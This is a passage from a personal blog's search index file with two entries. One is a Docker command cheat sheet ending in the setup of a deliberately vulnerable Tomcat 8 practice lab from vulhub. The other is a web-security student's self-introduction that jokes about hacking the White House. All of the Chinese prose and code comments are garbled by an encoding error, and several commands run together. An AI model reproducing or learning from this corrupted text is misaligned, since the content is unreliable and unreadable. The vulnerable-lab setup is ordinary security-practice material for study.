aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>-pï¼šå®¹å™¨å†…éƒ¨ç«¯å£ç»‘å®šåˆ°æŒ‡å®šçš„ä¸»æœºç«¯å£</p></li><li><p>-Pï¼šå®¹å™¨å†…éƒ¨ç«¯å£éšæœºæ˜ å°„åˆ°ä¸»æœºçš„ç«¯å£</p></li><li><p>-tï¼šæä¾›ç»ˆç«¯è¾“å…¥</p></li><li><p>-iï¼šæä¾›äº¤äº’</p></li><li><p>-dï¼šå®¹å™¨åœ¨åå°è¿è¡Œ</p></li></ul><h4 id="æŸ¥çœ‹é•œåƒçŠ¶æ€"><a href="#æŸ¥çœ‹é•œåƒçŠ¶æ€" class="headerlink" title="æŸ¥çœ‹é•œåƒçŠ¶æ€"></a>æŸ¥çœ‹é•œåƒçŠ¶æ€</h4><pre class="line-numbers language-shell"><code class="language-shell">docker ps          #æŸ¥çœ‹æ­£åœ¨è¿è¡Œä¸­çš„çš„å®¹å™¨docker ps -a       #æŸ¥çœ‹æ‰€æœ‰å®¹å™¨docker ps -q       #çœ‹æ­£åœ¨è¿è¡Œä¸­çš„çš„å®¹å™¨ï¼šä»…åˆ—å‡ºç¼–å·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="åœæ­¢å®¹å™¨"><a href="#åœæ­¢å®¹å™¨" class="headerlink" title="åœæ­¢å®¹å™¨"></a>åœæ­¢å®¹å™¨</h4><pre class="line-numbers language-shell"><code class="language-shell">docker stop xxx      #æŒ‡å®šç¼–å·<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¿è¡Œå®¹å™¨"><a href="#è¿è¡Œå®¹å™¨" class="headerlink" title="è¿è¡Œå®¹å™¨"></a>è¿è¡Œå®¹å™¨</h4><pre class="line-numbers language-shell"><code class="language-shell">docker start XXX         #æŒ‡å®šç¼–å·<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é‡å¯å®¹å™¨"><a href="#é‡å¯å®¹å™¨" class="headerlink" title="é‡å¯å®¹å™¨"></a>é‡å¯å®¹å™¨</h4><pre class="line-numbers language-shell"><code class="language-shell">docker restart xxx      #æŒ‡å®šç¼–å·<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åˆ é™¤å®¹å™¨"><a href="#åˆ é™¤å®¹å™¨" class="headerlink" title="åˆ é™¤å®¹å™¨"></a>åˆ é™¤å®¹å™¨</h4><pre class="line-numbers language-shell"><code class="language-shell">docker rm xxxxxxxxxx      # åˆ é™¤æŒ‡å®šå®¹å™¨docker rm -f xxxxxxxxxx  # å¼ºåˆ¶åˆ é™¤è¿è¡Œä¸­çš„å®¹å™¨docker rm -f $(docker ps -aq) # è¿­ä»£åˆ é™¤å…¨éƒ¨çš„å®¹å™¨<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="è¿›å…¥å®¹å™¨çš„bash"><a href="#è¿›å…¥å®¹å™¨çš„bash" class="headerlink" title="è¿›å…¥å®¹å™¨çš„bash"></a>è¿›å…¥å®¹å™¨çš„bash</h4><pre class="line-numbers language-shell"><code class="language-shell">docker exec -it xxxxx /bin/bash   # è¿›å…¥åˆ°æŒ‡å®šå®¹å™¨å†…éƒ¨è¿›è¡Œä¿®æ”¹  å¼€å¯ä¸€ä¸ªæ–°çš„ç»ˆç«¯exit        #é€€å‡ºbash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="æ‹·è´æ–‡ä»¶"><a href="#æ‹·è´æ–‡ä»¶" class="headerlink" title="æ‹·è´æ–‡ä»¶"></a>æ‹·è´æ–‡ä»¶</h4><pre class="line-numbers language-shell"><code class="language-shell">cp ./flag xx:/var/www/html/flag      #å°†å½“å‰ç›®å½•çš„flagæ‹·è´åˆ°æŒ‡å®šä¸ºxx idçš„å®¹å™¨/var/www/html/flagä¸­cp xx:/var/www/html/flag .flag #å°†æŒ‡å®šä¸ºxx idçš„å®¹å™¨/var/www/htmlä¸‹çš„flagæ–‡ä»¶æ‹·è´åˆ°å½“å‰ç›®å½•flagæ–‡ä»¶ä¸­<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="docker-composeå®‰è£…"><a href="#docker-composeå®‰è£…" class="headerlink" title="docker-composeå®‰è£…"></a>docker-composeå®‰è£…</h4><pre class="line-numbers language-shell"><code class="language-shell">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¹‹åå°±æ˜¯è”åŠ¨vulhubä¸€é”®æ­ç¯å¢ƒã€‚</p><h4 id="vulhubä¸€é”®æ­æ¼æ´ç¯å¢ƒ"><a href="#vulhubä¸€é”®æ­æ¼æ´ç¯å¢ƒ" class="headerlink" title="vulhubä¸€é”®æ­æ¼æ´ç¯å¢ƒ"></a>vulhubä¸€é”®æ­æ¼æ´ç¯å¢ƒ</h4><pre class="line-numbers language-shell"><code class="language-shell">#é¦–å…ˆè¿›å…¥å¯¹åº”æ¼æ´ç¯å¢ƒçš„æ–‡ä»¶å¤¹Docker-compose up -d  #æ ¹æ®docker-compose.ymlè‡ªåŠ¨æ‹‰å–å®¹å™¨å¹¶å¯åŠ¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>tomcat8çš„docker-compose.yml:</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span> <span class="token key atrule">tomcat</span><span class="token punctuation">:</span>   <span class="token key atrule">image</span><span class="token punctuation">:</span> vulhub/tomcat<span class="token punctuation">:</span><span class="token number">8.0</span>   <span class="token key atrule">volumes</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> ./tomcat<span class="token punctuation">-</span>users.xml<span class="token punctuation">:</span>/usr/local/tomcat/conf/tomcat<span class="token punctuation">-</span>users.xml    <span class="token punctuation">-</span> ./context.xml<span class="token punctuation">:</span>/usr/local/tomcat/webapps/manager/META<span class="token punctuation">-</span>INF/context.xml    <span class="token punctuation">-</span> ./context.xml<span class="token punctuation">:</span>/usr/local/tomcat/webapps/host<span class="token punctuation">-</span>manager/META<span class="token punctuation">-</span>INF/context.xml   <span class="token key atrule">ports</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token string">"8080:8080"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªæˆ‘ä»‹ç»</title>
      <link href="/2021/10/31/zi-wo-jie-shao/"/>
      <url>/2021/10/31/zi-wo-jie-shao/</url>
      
        <content type="html"><![CDATA[<p>åæ ‡åŒ—äº¬ï¼Œåˆšåˆšä¿ç ”è‡³ä¸­ç§‘é™¢ä¿¡å·¥æ‰€ã€‚å¤§æ¦‚æ˜¯åœ¨å®ä¹ çš„æ—¶å€™å¯¹webå®‰å…¨äº§ç”Ÿäº†æµ“åšçš„å…´è¶£ï¼ŒæŒ–æ´åŸæ¥è¿™ä¹ˆå¥½ç©~~</p><p>åæ¥çœ‹äº†ä»£ç å®¡è®¡ä»¥åŠç™½æ—¥æ¢¦ç»„é•¿çš„Javaå®‰å…¨åˆ†äº«ï¼Œåˆè§‰å¾—ä»£å®¡å¥½å¥½ç©~~</p><p>æ€»çš„æ¥è¯´ç›®å‰æœ‰Javaä»£å®¡å’ŒæŒ–æ´è¿™ä¸¤ä¸ªæ–¹å‘ï¼Œä»Šåå°±æ‰“ç®—ç‚¹è¿™ä¸¤ä¸ªæŠ€èƒ½ç‚¹äº†ã€‚</p><p>æœ€ç»ˆçš„æ¢¦æƒ³è‚¯å®šæ˜¯æˆä¸ºå®‰å…¨ç ”ç©¶å‘˜ï¼Œå¹¶ä¸”åšå‡ºä¸€äº›æœ‰ç”¨çš„å·¥ä½œï¼ˆé»‘æ‰ç¾å›½ç™½å®«ç®—å—ï¼‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—²èŠ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…³äºSquirt1e </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
